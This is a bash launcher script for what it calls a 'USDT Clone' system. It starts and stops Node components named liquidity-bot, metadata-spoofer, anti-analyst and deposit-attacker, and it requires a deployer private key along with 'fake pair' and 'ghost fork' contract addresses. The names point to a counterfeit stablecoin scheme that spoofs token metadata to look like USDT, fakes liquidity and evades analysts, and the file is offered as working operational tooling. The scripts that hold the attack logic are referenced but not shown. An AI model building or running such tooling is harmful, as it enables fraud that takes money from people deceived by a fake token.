#!/bin/bash

# USDT Clone - Full System Orchestration Script
# Runs all components in the correct order

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
LOG_DIR="./logs"
PID_DIR="./pids"

# Create necessary directories
mkdir -p $LOG_DIR $PID_DIR

echo -e "${GREEN}🚀 Starting USDT Clone System...${NC}\n"

# Function to check if process is running
check_process() {
    local pid_file=$1
    if [ -f "$pid_file" ]; then
        local pid=$(cat "$pid_file")
        if ps -p $pid > /dev/null; then
            return 0
        fi
    fi
    return 1
}

# Function to start a component
start_component() {
    local name=$1
    local script=$2
    local log_file="$LOG_DIR/${name}.log"
    local pid_file="$PID_DIR/${name}.pid"
    
    echo -e "${YELLOW}Starting ${name}...${NC}"
    
    if check_process "$pid_file"; then
        echo -e "${RED}${name} is already running!${NC}"
        return 1
    fi
    
    # Start the component
    nohup node "$script" > "$log_file" 2>&1 &
    local pid=$!
    echo $pid > "$pid_file"
    
    # Wait a bit and check if it started successfully
    sleep 2
    if check_process "$pid_file"; then
        echo -e "${GREEN}✅ ${name} started (PID: $pid)${NC}"
        return 0
    else
        echo -e "${RED}❌ ${name} failed to start${NC}"
        return 1
    fi
}

# Function to stop a component
stop_component() {
    local name=$1
    local pid_file="$PID_DIR/${name}.pid"
    
    if check_process "$pid_file"; then
        local pid=$(cat "$pid_file")
        echo -e "${YELLOW}Stopping ${name} (PID: $pid)...${NC}"
        kill $pid
        rm -f "$pid_file"
        echo -e "${GREEN}✅ ${name} stopped${NC}"
    else
        echo -e "${YELLOW}${name} is not running${NC}"
    fi
}

# Function to show status
show_status() {
    echo -e "\n${GREEN}System Status:${NC}"
    echo "========================"
    
    local components=("liquidity-bot" "metadata-spoofer" "anti-analyst" "deposit-attacker")
    
    for component in "${components[@]}"; do
        local pid_file="$PID_DIR/${component}.pid"
        if check_process "$pid_file"; then
            local pid=$(cat "$pid_file")
            echo -e "${component}: ${GREEN}Running${NC} (PID: $pid)"
        else
            echo -e "${component}: ${RED}Stopped${NC}"
        fi
    done
    echo ""
}

# Parse command
case "$1" in
    start)
        # Check environment variables
        if [ -z "$DEPLOYER_PRIVATE_KEY" ]; then
            echo -e "${RED}Error: DEPLOYER_PRIVATE_KEY not set${NC}"
            exit 1
        fi
        
        if [ -z "$USDT_CLONE_ADDRESS" ]; then
            echo -e "${RED}Error: USDT_CLONE_ADDRESS not set${NC}"
            echo "Run deployment first: npm run deploy"
            exit 1
        fi
        
        # Start all components
        echo -e "${GREEN}Starting all components...${NC}\n"
        
        # 1. Start liquidity bot
        start_component "liquidity-bot" "scripts/lpBot.js"
        sleep 3
        
        # 2. Start metadata spoofer
        start_component "metadata-spoofer" "scripts/metadataSpoofer.js"
        sleep 2
        
        # 3. Start anti-analyst system
        start_component "anti-analyst" "scripts/antiAnalyst.js"
        sleep 2
        
        # 4. Optional: Start deposit attacker (only in test mode)
        if [ "$TEST_MODE" = "true" ]; then
            start_component "deposit-attacker" "scripts/depositAttack.js"
        fi
        
        show_status
        echo -e "${GREEN}✅ System startup complete!${NC}"
        echo -e "Check logs in: $LOG_DIR"
        ;;
        
    stop)
        echo -e "${GREEN}Stopping all components...${NC}\n"
        
        stop_component "deposit-attacker"
        stop_component "anti-analyst"
        stop_component "metadata-spoofer"
        stop_component "liquidity-bot"
        
        echo -e "\n${GREEN}✅ All components stopped${NC}"
        ;;
        
    restart)
        $0 stop
        sleep 2
        $0 start
        ;;
        
    status)
        show_status
        ;;
        
    logs)
        component=$2
        if [ -z "$component" ]; then
            echo "Usage: $0 logs <component>"
            echo "Components: liquidity-bot, metadata-spoofer, anti-analyst, deposit-attacker"
            exit 1
        fi
        
        log_file="$LOG_DIR/${component}.log"
        if [ -f "$log_file" ]; then
            tail -f "$log_file"
        else
            echo -e "${RED}Log file not found: $log_file${NC}"
        fi
        ;;
        
    deploy)
        echo -e "${GREEN}Running deployment...${NC}\n"
        node scripts/deploy.js
        ;;
        
    test)
        echo -e "${GREEN}Running tests...${NC}\n"
        npm test
        ;;
        
    *)
        echo "USDT Clone System Manager"
        echo "========================"
        echo ""
        echo "Usage: $0 {start|stop|restart|status|logs|deploy|test}"
        echo ""
        echo "Commands:"
        echo "  start    - Start all components"
        echo "  stop     - Stop all components"
        echo "  restart  - Restart all components"
        echo "  status   - Show component status"
        echo "  logs     - Tail component logs"
        echo "  deploy   - Deploy contracts"
        echo "  test     - Run test suite"
        echo ""
        echo "Environment variables required:"
        echo "  DEPLOYER_PRIVATE_KEY - Private key for deployment"
        echo "  USDT_CLONE_ADDRESS   - Deployed USDT clone address"
        echo "  FAKE_PAIR_ADDRESS    - Deployed fake pair address"
        echo "  GHOST_FORK_ADDRESS   - Deployed ghost fork address"
        echo ""
        exit 1
        ;;
esac

exit 0